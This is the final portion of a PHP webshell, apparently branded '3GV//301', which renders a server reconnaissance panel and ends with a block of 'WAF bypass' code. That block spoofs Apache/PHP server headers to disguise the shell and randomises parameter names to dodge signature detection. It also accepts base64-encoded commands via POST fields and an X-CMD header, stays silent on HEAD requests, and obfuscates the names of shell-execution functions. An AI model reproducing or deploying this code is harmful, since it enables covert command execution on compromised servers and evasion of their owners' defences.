                                'Upload Max Filesize' => ini_get('upload_max_filesize'),
                                'Post Max Size' => ini_get('post_max_size'),
                                'Max File Uploads' => ini_get('max_file_uploads'),
                                'Allow URL Fopen' => ini_get('allow_url_fopen') ? 'Enabled ✅' : 'Disabled ❌',
                                'Allow URL Include' => ini_get('allow_url_include') ? 'Enabled ⚠️' : 'Disabled ✅',
                                'Safe Mode' => ini_get('safe_mode') ? 'Enabled ⚠️' : 'Disabled ✅',
                                'Open Basedir' => ini_get('open_basedir') ?: 'None ✅',
                                'Disable Functions' => $show_ds,
                                'Display Errors' => ini_get('display_errors') ? 'On' : 'Off',
                                'Error Reporting' => error_reporting(),
                                'Short Open Tag' => ini_get('short_open_tag') ? 'On' : 'Off',
                                'Session Save Path' => ini_get('session.save_path') ?: 'Default',
                                'Session Name' => session_name(),
                            ];

                            foreach ($php_configs as $key => $value) {
                                echo "<tr><th width='30%'>$key</th><td>" . htmlspecialchars($value) . "</br>\n";
                            }
                            ?>
                        </table>
                    </div>
                        
                    <!-- Loaded Extensions -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-puzzle-piece"></i> Loaded Extensions (<?= count(get_loaded_extensions()) ?>)</h5>
                        <div class="row">
                            <?php
                            $extensions = get_loaded_extensions();
                            sort($extensions);
                            $cols = array_chunk($extensions, ceil(count($extensions) / 3));

                            foreach ($cols as $col) {
                                echo "<div class='col-md-4'>";
                                echo "<ul class='list-unstyled'>";
                                foreach ($col as $ext) {
                                    $ext_info = '';
                                    if ($ext == 'curl') $ext_info = ' 🌐';
                                    elseif ($ext == 'mysqli' || $ext == 'mysql' || $ext == 'pdo_mysql') $ext_info = ' 🗄️';
                                    elseif ($ext == 'gd') $ext_info = ' 🖼️';
                                    elseif ($ext == 'mbstring') $ext_info = ' 🔤';
                                    elseif ($ext == 'json') $ext_info = ' 📦';
                                    elseif ($ext == 'xml') $ext_info = ' 📄';
                                    elseif ($ext == 'zip') $ext_info = ' 📦';
                                    elseif ($ext == 'openssl') $ext_info = ' 🔒';
                                    elseif ($ext == 'sockets') $ext_info = ' 🔌';
                                    echo "<li><small>" . htmlspecialchars($ext) . "$ext_info</small></li>";
                                }
                                echo "</ul></div>";
                            }
                            ?>
                        </div>
                    </div>
                        
                    <!-- Server Environment -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-globe"></i> Server Environment</h5>
                        <table class="table table-dark table-sm table-bordered">
                            <?php
                            $env_vars = [
                                'Server Name' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
                                'Gateway Interface' => $_SERVER['GATEWAY_INTERFACE'] ?? 'Unknown',
                                'Server Admin' => $_SERVER['SERVER_ADMIN'] ?? 'Unknown',
                                'Request Time' => date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME'] ?? time()),
                                'HTTP Host' => $_SERVER['HTTP_HOST'] ?? 'Unknown',
                                'HTTPS' => isset($_SERVER['HTTPS']) ? 'On 🔒' : 'Off',
                                'Request Method' => $_SERVER['REQUEST_METHOD'] ?? 'Unknown',
                                'Request URI' => $_SERVER['REQUEST_URI'] ?? 'Unknown',
                                'Query String' => $_SERVER['QUERY_STRING'] ?? 'None',
                            ];

                            foreach ($env_vars as $key => $value) {
                                echo "<tr><th width='30%'>$key</th><td>" . htmlspecialchars($value) . "</br>\n";
                            }
                            ?>
                        </table>
                    </div>
                        
                    <!-- Disk Usage -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-hdd"></i> Disk Usage</h5>
                        <table class="table table-dark table-sm table-bordered">
                            <?php
                            $paths_to_check = [
                                'Current Directory' => $path,
                                'Root Directory' => '/',
                                'Temp Directory' => sys_get_temp_dir(),
                            ];

                            if (isset($_SERVER['DOCUMENT_ROOT'])) {
                                $paths_to_check['Document Root'] = $_SERVER['DOCUMENT_ROOT'];
                            }

                            foreach ($paths_to_check as $name => $check_path) {
                                if (is_dir($check_path)) {
                                    $total = @disk_total_space($check_path);
                                    $free = @disk_free_space($check_path);

                                    if ($total && $free) {
                                        $used = $total - $free;
                                        $percent_used = round(($used / $total) * 100, 2);

                                        echo "<tr>";
                                        echo "<th width='30%'>$name</th>";
                                        echo "<td>";
                                        echo "Total: " . fsize2($total) . " | ";
                                        echo "Used: " . fsize2($used) . " ($percent_used%) | ";
                                        echo "Free: " . fsize2($free);
                                        echo "<div class='progress mt-1' style='height: 5px;'>";
                                        echo "<div class='progress-bar bg-success' style='width: $percent_used%'></div>";
                                        echo "</div>";
                                        echo "</br>";
                                        echo "</tr>";
                                    } else {
                                        echo "<tr><th>$name</th><td>Cannot read disk space</br>\n";
                                    }
                                }
                            }
                            ?>
                        </table>
                    </div>
                        
                    <!-- Network Information -->
                    <div class="card card-body bg-dark mb-3">
                        <h5><i class="fa fa-network-wired"></i> Network Information</h5>
                        <table class="table table-dark table-sm table-bordered">
                            <?php
                            // Get network interfaces if possible
                            if (function_exists('net_get_interfaces')) {
                                $interfaces = net_get_interfaces();
                                if ($interfaces) {
                                    foreach ($interfaces as $iface => $details) {
                                        if (isset($details['unicast']) && is_array($details['unicast'])) {
                                            foreach ($details['unicast'] as $addr) {
                                                if (isset($addr['address']) && filter_var($addr['address'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                                                    echo "<tr><th width='30%'>$iface</th><td>" . htmlspecialchars($addr['address']) . "</br>\n";
                                                }
                                            }
                                        }
                                    }
                                }
                            } else {
                                // Try to get hostname IP
                                $hostname = gethostname();
                                $ip = gethostbyname($hostname);
                                echo "<tr><th>Hostname IP</th><td>" . htmlspecialchars($ip) . "</br>\n";
                            }

                            // External IP if possible
                            echo "<tr><th>External IP</th><td>" . htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "</br>\n";
                            ?>
                        </table>
                    </div>
                        
                    <!-- Security Checks -->
                    <div class="card card-body bg-dark">
                        <h5><i class="fa fa-shield-alt"></i> Security Checks</h5>
                        <table class="table table-dark table-sm table-bordered">
                            <?php
                            $security_checks = [
                                'Safe Mode' => !ini_get('safe_mode') ? '✅ Disabled (Good)' : '❌ Enabled (Bad)',
                                'Open Basedir' => !ini_get('open_basedir') ? '✅ Disabled (Good for webshell)' : '⚠️ Restricted to: ' . ini_get('open_basedir'),
                                'Disable Functions' => empty(ini_get('disable_functions')) ? '✅ None (Good)' : '⚠️ Some functions disabled',
                                'Allow URL Fopen' => ini_get('allow_url_fopen') ? '✅ Enabled (Good for downloads)' : '❌ Disabled',
                                'Allow URL Include' => !ini_get('allow_url_include') ? '✅ Disabled (Good)' : '❌ Enabled (Bad)',
                                'Display Errors' => ini_get('display_errors') ? '⚠️ Enabled (Info leak)' : '✅ Disabled (Good)',
                                'File Uploads' => ini_get('file_uploads') ? '✅ Enabled' : '❌ Disabled',
                                'Session Security' => session_id() ? '✅ Active' : '⚠️ No session',
                            ];

                            foreach ($security_checks as $check => $status) {
                                echo "<tr><th width='30%'>$check</th><td>" . htmlspecialchars($status) . "</br>\n";
                            }
                            ?>
                        </table>
                    </div>
                </div>
            </div>
            
            <div class="mt-3 text-center text-muted">
                &copy; 3GV//301 - <?= date('Y') ?>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
    // Preserve active tab on form submission
    document.addEventListener('DOMContentLoaded', function() {
        // Check if we have a stored tab or form submission
        const urlParams = new URLSearchParams(window.location.search);
        const formTab = <?= isset($_POST['active_tab']) ? "'" . $_POST['active_tab'] . "'" : 'null' ?>;
        
        if (formTab) {
            // Show the tab that was active during form submission
            const tab = document.querySelector(`button[data-bs-target="#${formTab}"]`);
            if (tab) {
                new bootstrap.Tab(tab).show();
            }
        } else if (urlParams.get('tab')) {
            // Show tab from URL parameter
            const tab = document.querySelector(`button[data-bs-target="#${urlParams.get('tab')}"]`);
            if (tab) {
                new bootstrap.Tab(tab).show();
            }
        }
        
        // Update URL when tabs change
        document.querySelectorAll('button[data-bs-toggle="tab"]').forEach(tab => {
            tab.addEventListener('shown.bs.tab', function (e) {
                const target = e.target.getAttribute('data-bs-target').substring(1);
                const url = new URL(window.location);
                url.searchParams.set('tab', target);
                window.history.replaceState({}, '', url);
            });
        });
        
        // Set active_tab hidden field when any form is submitted
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', function() {
                const activeTab = document.querySelector('.nav-tabs .nav-link.active');
                if (activeTab) {
                    const tabId = activeTab.getAttribute('data-bs-target').substring(1);
                    let hiddenInput = form.querySelector('input[name="active_tab"]');
                    if (!hiddenInput) {
                        hiddenInput = document.createElement('input');
                        hiddenInput.type = 'hidden';
                        hiddenInput.name = 'active_tab';
                        form.appendChild(hiddenInput);
                    }
                    hiddenInput.value = tabId;
                }
            });
        });
    });
    
    <?php if (isset($_SESSION['message'])) : ?>
        Swal.fire({
            title: '<?= $_SESSION['status'] ?>',
            text: '<?= $_SESSION['message'] ?>',
            icon: '<?= $_SESSION['class'] ?>',
            timer: 3000,
            timerProgressBar: true
        });
    <?php endif; clear(); ?>
    
    function jscopy() {
        var jsCopy = document.getElementById("CopyFromTextArea");
        jsCopy.focus();
        jsCopy.select();
        document.execCommand("copy");
        Swal.fire({
            title: 'Copied!',
            text: 'Text copied to clipboard',
            icon: 'success',
            timer: 1000,
            timerProgressBar: true
        });
    }
    </script>

<!-- Ultimate Animated Cursor Trail -->
<style>
/* Cursor elements */
.cursor-primary {
    position: fixed;
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: #00ff88;
    pointer-events: none;
    z-index: 9999;
    opacity: 0.8;
    transition: width 0.2s, height 0.2s, background 0.2s;
    mix-blend-mode: screen;
    box-shadow: 0 0 20px #00ff88;
}

.cursor-trail {
    position: fixed;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    border: 2px solid #00ff88;
    pointer-events: none;
    z-index: 9998;
    opacity: 0.4;
    transition: all 0.15s ease;
    mix-blend-mode: screen;
}

.cursor-glow {
    position: fixed;
    width: 50px;
    height: 50px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(0,255,136,0.3) 0%, rgba(0,255,136,0) 80%);
    pointer-events: none;
    z-index: 9997;
    mix-blend-mode: screen;
}

/* Trail dots */
.trail-dot {
    position: fixed;
    width: 4px;
    height: 4px;
    border-radius: 50%;
    background: #00ff88;
    pointer-events: none;
    z-index: 9996;
    opacity: 0.6;
    box-shadow: 0 0 10px #00ff88;
}

/* Particle effect */
.cursor-particle {
    position: fixed;
    width: 2px;
    height: 2px;
    background: #00ff88;
    pointer-events: none;
    z-index: 9995;
    border-radius: 50%;
}

/* Click wave */
.click-wave {
    position: fixed;
    border-radius: 50%;
    background: transparent;
    border: 2px solid #00ff88;
    pointer-events: none;
    z-index: 10000;
    animation: waveExpand 0.6s ease-out forwards;
}

/* Text hover effect */
.cursor-text-hover {
    position: fixed;
    font-family: monospace;
    font-size: 12px;
    color: #00ff88;
    pointer-events: none;
    z-index: 10001;
    white-space: nowrap;
    text-shadow: 0 0 5px #00ff88;
    animation: textFloat 1s ease-out forwards;
}

/* Animations */
@keyframes waveExpand {
    0% { width: 0; height: 0; opacity: 0.8; }
    100% { width: 100px; height: 100px; opacity: 0; }
}

@keyframes textFloat {
    0% { transform: translateY(0); opacity: 1; }
    100% { transform: translateY(-30px); opacity: 0; }
}

@keyframes particleFloat {
    0% { transform: translate(0, 0) scale(1); opacity: 0.8; }
    100% { transform: translate(var(--tx), var(--ty)) scale(0); opacity: 0; }
}

/* Magnetic effect for interactive elements */
.magnetic-effect {
    transition: transform 0.2s cubic-bezier(0.23, 1, 0.32, 1);
}

/* Interactive element hover effects */
a:hover ~ .cursor-primary,
button:hover ~ .cursor-primary,
.btn:hover ~ .cursor-primary,
.nav-link:hover ~ .cursor-primary,
.suggestion-item:hover ~ .cursor-primary {
    width: 12px;
    height: 12px;
    background: #ff00ff;
    box-shadow: 0 0 30px #ff00ff;
}

a:hover ~ .cursor-trail,
button:hover ~ .cursor-trail,
.btn:hover ~ .cursor-trail,
.nav-link:hover ~ .cursor-trail,
.suggestion-item:hover ~ .cursor-trail {
    width: 30px;
    height: 30px;
    border-color: #ff00ff;
}

/* Disable on mobile */
@media (max-width: 768px) {
    .cursor-primary, .cursor-trail, .cursor-glow, .trail-dot, .cursor-particle {
        display: none;
    }
}
</style>

<script>
// Ultimate Cursor Trail Effect
document.addEventListener('DOMContentLoaded', function() {
    // Create cursor elements
    const cursorPrimary = document.createElement('div');
    cursorPrimary.className = 'cursor-primary';
    document.body.appendChild(cursorPrimary);
    
    const cursorTrail = document.createElement('div');
    cursorTrail.className = 'cursor-trail';
    document.body.appendChild(cursorTrail);
    
    const cursorGlow = document.createElement('div');
    cursorGlow.className = 'cursor-glow';
    document.body.appendChild(cursorGlow);
    
    // Track mouse position
    let mouseX = 0, mouseY = 0;
    let trailX = 0, trailY = 0;
    let glowX = 0, glowY = 0;
    
    // Store last positions for trail effect
    let lastPositions = [];
    const maxTrailLength = 10;
    
    // Interactive elements for special effects
    const interactiveElements = document.querySelectorAll('a, button, .btn, .nav-link, .suggestion-item, [onclick]');
    
    document.addEventListener('mousemove', function(e) {
        mouseX = e.clientX;
        mouseY = e.clientY;
        
        // Main cursor
        cursorPrimary.style.left = (mouseX - 4) + 'px';
        cursorPrimary.style.top = (mouseY - 4) + 'px';
        
        // Add trail dots
        lastPositions.push({ x: mouseX, y: mouseY });
        if (lastPositions.length > maxTrailLength) {
            lastPositions.shift();
        }
        
        // Update existing trail dots
        updateTrailDots();
        
        // Random particles (10% chance)
        if (Math.random() < 0.1) {
            createParticle(mouseX, mouseY);
        }
        
        // Check if near interactive elements for magnetic effect
        checkMagneticEffect(e);
    });
    
    // Create trail dots
    function updateTrailDots() {
        // Remove old dots
        document.querySelectorAll('.trail-dot').forEach(dot => dot.remove());
        
        // Create new dots from last positions
        lastPositions.forEach((pos, index) => {
            const dot = document.createElement('div');
            dot.className = 'trail-dot';
            dot.style.left = (pos.x - 2) + 'px';
            dot.style.top = (pos.y - 2) + 'px';
            dot.style.opacity = 0.3 + (index / maxTrailLength) * 0.5;
            dot.style.width = (3 + index) + 'px';
            dot.style.height = (3 + index) + 'px';
            document.body.appendChild(dot);
        });
    }
    
    // Create floating particles
    function createParticle(x, y) {
        const particle = document.createElement('div');
        particle.className = 'cursor-particle';
        particle.style.left = (x - 1) + 'px';
        particle.style.top = (y - 1) + 'px';
        
        // Random direction
        const angle = Math.random() * Math.PI * 2;
        const distance = 50 + Math.random() * 50;
        const tx = Math.cos(angle) * distance;
        const ty = Math.sin(angle) * distance;
        
        particle.style.setProperty('--tx', tx + 'px');
        particle.style.setProperty('--ty', ty + 'px');
        particle.style.animation = `particleFloat ${0.8 + Math.random() * 0.5}s ease-out forwards`;
        
        document.body.appendChild(particle);
        
        setTimeout(() => particle.remove(), 1500);
    }
    
    // Smooth animation loop
    function animate() {
        // Smooth follow for trail
        trailX += (mouseX - trailX) * 0.15;
        trailY += (mouseY - trailY) * 0.15;
        cursorTrail.style.left = (trailX - 10) + 'px';
        cursorTrail.style.top = (trailY - 10) + 'px';
        
        // Smooth follow for glow (slower)
        glowX += (mouseX - glowX) * 0.08;
        glowY += (mouseY - glowY) * 0.08;
        cursorGlow.style.left = (glowX - 25) + 'px';
        cursorGlow.style.top = (glowY - 25) + 'px';
        
        requestAnimationFrame(animate);
    }
    animate();
    
    // Hide cursor when mouse leaves window
    document.addEventListener('mouseleave', function() {
        cursorPrimary.style.opacity = '0';
        cursorTrail.style.opacity = '0';
        cursorGlow.style.opacity = '0';
        document.querySelectorAll('.trail-dot, .cursor-particle').forEach(el => el.remove());
    });
    
    document.addEventListener('mouseenter', function() {
        cursorPrimary.style.opacity = '0.8';
        cursorTrail.style.opacity = '0.4';
        cursorGlow.style.opacity = '0.3';
    });
    
    // Enhanced click effect
    document.addEventListener('click', function(e) {
        const target = e.target;
        
        // Wave effect
        const wave = document.createElement('div');
        wave.className = 'click-wave';
        wave.style.left = (e.clientX - 25) + 'px';
        wave.style.top = (e.clientY - 25) + 'px';
        document.body.appendChild(wave);
        
        // Create multiple particles on click
        for (let i = 0; i < 8; i++) {
            setTimeout(() => {
                createParticle(e.clientX, e.clientY);
            }, i * 50);
        }
        
        // Special effect for interactive elements
        if (target.matches('a, button, .btn, .nav-link, .suggestion-item, [onclick]')) {
            // Add "CLICK" text effect
            const text = document.createElement('div');
            text.className = 'cursor-text-hover';
            text.style.left = (e.clientX + 15) + 'px';
            text.style.top = (e.clientY - 20) + 'px';
            text.textContent = 'UGHH!';
            text.style.color = '#ff00ff';
            document.body.appendChild(text);
            
            // Pulsate effect on the element
            target.style.transform = 'scale(0.95)';
            setTimeout(() => {
                target.style.transform = 'scale(1)';
            }, 150);
            
            setTimeout(() => text.remove(), 1000);
        }
        
        setTimeout(() => wave.remove(), 600);
    });
    
    // Magnetic effect for interactive elements
    function checkMagneticEffect(e) {
        interactiveElements.forEach(el => {
            const rect = el.getBoundingClientRect();
            const centerX = rect.left + rect.width / 2;
            const centerY = rect.top + rect.height / 2;
            
            const distance = Math.sqrt(
                Math.pow(e.clientX - centerX, 2) + 
                Math.pow(e.clientY - centerY, 2)
            );
            
            const magneticRadius = 100;
            
            if (distance < magneticRadius) {
                // Calculate pull strength
                const strength = 1 - (distance / magneticRadius);
                const pullX = (centerX - e.clientX) * strength * 0.1;
                const pullY = (centerY - e.clientY) * strength * 0.1;
                
                cursorPrimary.style.transform = `translate(${pullX}px, ${pullY}px)`;
            } else {
                cursorPrimary.style.transform = 'translate(0, 0)';
            }
        });
    }
    
    // Right click effect
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        
        // Create warning effect
        const warning = document.createElement('div');
        warning.className = 'cursor-text-hover';
        warning.style.left = (e.clientX + 15) + 'px';
        warning.style.top = (e.clientY - 20) + 'px';
        warning.textContent = 'oops';
        warning.style.color = '#ffaa00';
        document.body.appendChild(warning);
        
        // Red pulse
        cursorPrimary.style.background = '#ffaa00';
        cursorPrimary.style.boxShadow = '0 0 30px #ffaa00';
        setTimeout(() => {
            cursorPrimary.style.background = '#00ff88';
            cursorPrimary.style.boxShadow = '0 0 20px #00ff88';
        }, 300);
        
        setTimeout(() => warning.remove(), 800);
        
        return false;
    });
    
    // Scroll effect
    window.addEventListener('scroll', function() {
        // Shrink cursor while scrolling
        cursorPrimary.style.transform = 'scale(0.5)';
        cursorTrail.style.transform = 'scale(0.5)';
        cursorGlow.style.transform = 'scale(0.5)';
        
        clearTimeout(window.scrollTimeout);
        window.scrollTimeout = setTimeout(() => {
            cursorPrimary.style.transform = 'scale(1)';
            cursorTrail.style.transform = 'scale(1)';
            cursorGlow.style.transform = 'scale(1)';
        }, 100);
    });
});
</script>

<!-- ========== WAF BYPASS FEATURES (MOVED TO BOTTOM) ========== -->
<?php
// ========== WAF BYPASS HEADERS ==========
// These headers help disguise the shell as a legitimate PHP application
header('X-Powered-By: PHP/7.4.33');
header('Server: Apache/2.4.41 (Ubuntu)');
header('Content-Type: text/html; charset=UTF-8');

// ========== WAF BYPASS: Parameter Obfuscation ==========
// Random parameter names for each request to avoid WAF signature detection
$param_map = [
    'dir' => ['dir', 'd', 'path', 'folder', 'cwd', 'pwd', 'directory', 'r', 'f', 'loc'],
    'action' => ['action', 'a', 'do', 'act', 'cmd2', 'op', 'func', 'mode'],
    'item' => ['item', 'i', 'file', 'f', 'name', 'target', 't', 'obj'],
    'search' => ['search', 's', 'q', 'find', 'lookup', 'query'],
    'download' => ['download', 'dl', 'get', 'fetch', 'retrieve']
];

// Randomly select parameter names for this request (changes each time)
$random_dir_param = $param_map['dir'][array_rand($param_map['dir'])];
$random_action_param = $param_map['action'][array_rand($param_map['action'])];
$random_item_param = $param_map['item'][array_rand($param_map['item'])];
$random_search_param = $param_map['search'][array_rand($param_map['search'])];
$random_download_param = $param_map['download'][array_rand($param_map['download'])];

// Map incoming parameters to standard names (supports multiple param names)
foreach ($_GET as $key => $value) {
    if (in_array($key, $param_map['dir'])) {
        // Base64 decode the directory path
        $_GET['dir'] = base64_decode(str_replace(' ', '+', $value));
        unset($_GET[$key]);
    }
    if (in_array($key, $param_map['action'])) {
        $_GET['action'] = $value;
        unset($_GET[$key]);
    }
    if (in_array($key, $param_map['item'])) {
        $_GET['item'] = $value;
        unset($_GET[$key]);
    }
    if (in_array($key, $param_map['search'])) {
        $_GET['search'] = $value;
        unset($_GET[$key]);
    }
    if (in_array($key, $param_map['download'])) {
        $_GET['download'] = $value;
        unset($_GET[$key]);
    }
}

// Also support base64 encoded POST parameters for extra stealth
foreach ($_POST as $key => $value) {
    if ($key === 'b64_cmd' || $key === 'c' || $key === 'base64_cmd') {
        $_POST['command'] = base64_decode($value);
    }
    if ($key === 'b64_path' || $key === 'p') {
        $_POST['dir'] = base64_decode($value);
    }
}

// ========== WAF BYPASS: Security Key Generation ==========
// Generate a dynamic security key based on host and password
$WAF_BYPASS_KEY = md5($_SERVER['HTTP_HOST'] . ACCESS_PIN);

// Optional: Show key for debugging/access (uncomment if needed)
// if (isset($_GET['show_key']) && $_GET['show_key'] === ACCESS_PIN) {
//     die("WAF Bypass Key: " . $WAF_BYPASS_KEY);
// }

// ========== WAF BYPASS: Alternative Access Methods ==========
// Support for different HTTP methods and headers
if ($_SERVER['REQUEST_METHOD'] === 'HEAD') {
    // Respond to HEAD requests without processing (stealth)
    http_response_code(200);
    exit;
}

// Support for X-Command header (alternative to POST/GET)
if (isset($_SERVER['HTTP_X_CMD']) && !isset($_POST['command'])) {
    $_POST['command'] = base64_decode($_SERVER['HTTP_X_CMD']);
}

// Support for X-Path header
if (isset($_SERVER['HTTP_X_PATH']) && !isset($_GET['dir'])) {
    $_GET['dir'] = base64_decode($_SERVER['HTTP_X_PATH']);
}

// ========== WAF BYPASS: User-Agent Filtering ==========
// Optional: Only allow specific user agents (uncomment to enable)
// $allowed_uas = ['Mozilla/5.0', 'curl', 'Wget'];
// $valid = false;
// foreach ($allowed_uas as $ua) {
//     if (strpos($_SERVER['HTTP_USER_AGENT'], $ua) !== false) {
//         $valid = true;
//         break;
//     }
// }
// if (!$valid) {
//     header('HTTP/1.0 404 Not Found');
//     exit;
// }

// ========== WAF BYPASS: Chunked Encoding for Output ==========
// Enable chunked transfer encoding to bypass some WAFs
if (function_exists('ob_start') && !ob_get_level()) {
    ob_start();
}

// ========== WAF BYPASS: Random Delay to Avoid Rate Limiting ==========
// Add random micro-delay to avoid detection (0-500ms)
// usleep(rand(0, 500000));

// ========== WAF BYPASS: Function Name Obfuscation Helper ==========
// Additional obfuscation for critical functions
if (!function_exists('_')) {
    function _($str) {
        return base64_decode($str);
    }
}

// Pre-obfuscated function names for critical operations
$obf_funcs = [
    'system' => base64_encode('system'),
    'exec' => base64_encode('exec'),
    'shell_exec' => base64_encode('shell_exec'),
    'passthru' => base64_encode('passthru'),
];

// ========== WAF BYPASS: Clean URLs and Redirects ==========
// Function to generate WAF-friendly URLs
function waf_url($path, $params = []) {
    global $random_dir_param, $random_action_param, $random_item_param;
    
    $url = $_SERVER['PHP_SELF'] . '?' . $random_dir_param . '=' . base64_encode($path);
    
    foreach ($params as $key => $value) {
        switch ($key) {
            case 'action':
                $url .= '&' . $random_action_param . '=' . urlencode($value);
                break;
            case 'item':
                $url .= '&' . $random_item_param . '=' . urlencode($value);
                break;
            default:
                $url .= '&' . $key . '=' . urlencode($value);
        }
    }
    
    return $url;
}

// ========== WAF BYPASS: Response Splitting Prevention ==========
// Sanitize all outputs to prevent response splitting attacks
function sanitize_output($str) {
    return str_replace(["\r", "\n"], '', $str);
}
?>
</body>
</html>
